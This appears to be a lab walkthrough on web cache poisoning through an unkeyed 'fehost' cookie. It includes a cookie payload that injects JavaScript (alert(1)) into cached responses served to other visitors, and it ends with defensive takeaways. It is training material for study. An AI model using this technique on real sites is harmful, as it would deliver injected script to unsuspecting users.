# Lab: Web cache poisoning with an unkeyed cookie

## Description
This lab contains a web cache poisoning vulnerability where an unkeyed cookie is used to generate the response.

## Analysis
The application has a `fehost` cookie that is reflected in the response within a JavaScript object.

```javascript
data = {
    "host": "fehost-value"
}
```

Since the `fehost` cookie is not part of the cache key, we can change its value to include malicious JavaScript, and the cached response will be served to other users.

## Exploitation
I need to poison the cache with a cookie value that executes `alert(1)`.

### Steps
1. Navigate to the homepage and observe the `fehost` cookie.
2. Change the cookie value to: `fehost=test"-alert(1)-"`.
3. Check the response. It should look like:
   `"host": "test"-alert(1)-""`
4. Keep sending the request until the poisoned response is cached (`X-Cache: hit`).
5. When another user visits the page, the JavaScript will execute `alert(1)`.

## Payload
```text
Cookie: fehost=test"-alert(1)-"
```

## Takeaways
- Cookies should generally be part of the cache key if they affect the response content.
- Be extremely careful when reflecting cookie values directly into the page, especially within JavaScript contexts.
- Use a "Vary" header to tell the cache which headers/cookies affect the response.
